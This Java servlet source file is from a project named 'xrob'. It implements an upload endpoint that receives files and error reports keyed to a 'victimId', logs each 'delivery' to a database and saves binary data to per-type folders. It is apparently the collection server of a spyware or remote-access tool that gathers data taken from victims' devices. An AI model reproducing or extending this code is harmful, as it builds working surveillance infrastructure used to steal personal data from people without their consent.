package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Deliveries;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.utils.APIResponse;
import com.theah64.xrob.api.utils.FilePart;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;
import java.io.*;

/**
 * Created by theapache64 on 11/18/2015,12:10 AM.
 */

@WebServlet(urlPatterns = {AdvancedBaseServlet.VERSION_CODE + "/upload"})
@MultipartConfig
public class FileUploadServlet extends AdvancedBaseServlet {


    private static final java.lang.String SUCCESS_MESSAGE_TEXT_DATA_SAVED = "Text data saved";
    private static final java.lang.String SUCCESS_MESSAGE_BINARY_DATA_SAVED = "Binary data saved";
    private static final String ERROR_MESSAGE_FAILED_TO_SAVE_DATA = "Failed to save data";


    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        setGETMethodNotSupported(resp);
    }


    @Override
    protected boolean isSecureServlet() {
        return false;
    }

    @Override
    protected String[] getRequiredParameters() {
        return new String[]{KEY_ERROR, // To track if the delivery has any error
                KEY_DATA_TYPE, //Data type of the file
                KEY_MESSAGE //To explain about the success or error
        };
    }

    @Override
    protected void doAdvancedPost() throws Exception {

        final String victimId = getHeaderSecurity().getVictimId();

        final boolean hasError = getBooleanParameter(KEY_ERROR);
        final String message = getStringParameter(KEY_MESSAGE);
        final String dataType = getStringParameter(KEY_DATA_TYPE);

        //Has all needed params, so add it to deliveries
        final Delivery newDelivery = new Delivery(victimId, hasError, message, dataType, -1);
        //What ever the data_type, adding delivery;
        Deliveries.getInstance().addv2(newDelivery);

        if (!hasError) {

            //No errors found
            if (super.has(KEY_DATA_TYPE)) {

                final Delivery.Type deliveryType = new Delivery.Type(getServletContext(), dataType);

                //Yes,it's a valid data type
                final Part dataFilePart = getHttpServletRequest().getPart(KEY_DATA);

                if (dataFilePart != null) {

                    final String contentType = dataFilePart.getContentType();
                    final String fileName = new FilePart(dataFilePart).getRandomFileName();
                    final long size = dataFilePart.getSize();

                    if (deliveryType.isBinary()) {

                        //The data is binary, so instead of saving the data to the database, we're saving the file into it's specific folder.
                        final String dataStoragePath = deliveryType.getStoragePath();
                        final File dataStorageDir = new File(dataStoragePath);

                        if (!dataStorageDir.exists() && !dataStorageDir.mkdirs()) {

                            throw new Exception("Failed to create upload directory : " + dataStorageDir.getAbsolutePath());

                        } else {
                            //The directory exists,so create the file
                            final FileOutputStream fos = new FileOutputStream(deliveryType.getStoragePath() + File.separator + fileName);
                            final InputStream is = dataFilePart.getInputStream();
                            byte[] buffer = new byte[1024];
                            int read;

                            while ((read = is.read(buffer)) != -1) {
                                fos.write(buffer, 0, read);
                            }

                            fos.flush();
                            fos.close();
                            is.close();
                        }

                        System.out.println(String.format("FileNode saved :)\nName : %s\nContentType:%s\nSize: %d", fileName, contentType, size));

                        //TODO: Add the file details to the database

                        //Success message
                        getWriter().write(new APIResponse(SUCCESS_MESSAGE_BINARY_DATA_SAVED, null).getResponse());


                    } else {
                        throw new Exception("Only binary should be passed through this gate.");
                    }


                } else {
                    //ERROR: No file found
                    throw new Exception(String.format("%s file is missing", KEY_DATA));
                }


            } else {
                //DATA or DATA_TYPE is missing or invalid
                throw new Exception(String.format("%s is missing or invalid", KEY_DATA_TYPE));
            }

        } else {
            //Has error
            getWriter().write(
                    new APIResponse("Error report added", null).getResponse()
            );
        }

    }

    /**
     * @param inputStream is
     * @return text content
     * @throws IOException
     */
    private String getFileContents(final InputStream inputStream) throws IOException {
        final InputStreamReader isr = new InputStreamReader(inputStream);
        final BufferedReader br = new BufferedReader(isr);
        final StringBuilder fileContents = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) {
            fileContents.append(line);
        }
        inputStream.close();
        isr.close();
        br.close();
        return fileContents.toString();
    }


}
